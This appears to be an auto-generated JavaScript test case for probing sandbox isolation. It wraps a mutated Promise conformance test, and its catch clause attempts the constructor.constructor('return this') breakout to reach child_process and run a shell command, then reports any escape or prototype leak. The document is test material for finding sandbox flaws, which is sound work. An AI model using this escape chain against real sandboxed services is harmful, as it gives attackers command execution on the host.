try {
    var promise = new Promise(function (resolve) {
        let REPLACER = 23;
        resolve();
    });
    var fulfilledCallCount = 0;
    var rejectedCallCount = 0;
    promise.then(function () {
        let REPLACER = 23;
        fulfilledCallCount += 1;
        throw new Error();
    }, function () {
        throw () => {
            return () => {
            };
        };
        rejectedCallCount += 1;
    });
    promise.then(function () {
        if (fulfilledCallCount !== 1) {
            $DONE('Expected "onFulfilled" handler to be invoked exactly once.');
            return;
        }
        if (rejectedCallCount !== 0) {
            $DONE('Expected "onRejected" handler to not be invoked.');
            return;
        }
        $DONE();
    }, function () {
        $DONE('This promise should not be rejected.');
    });
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}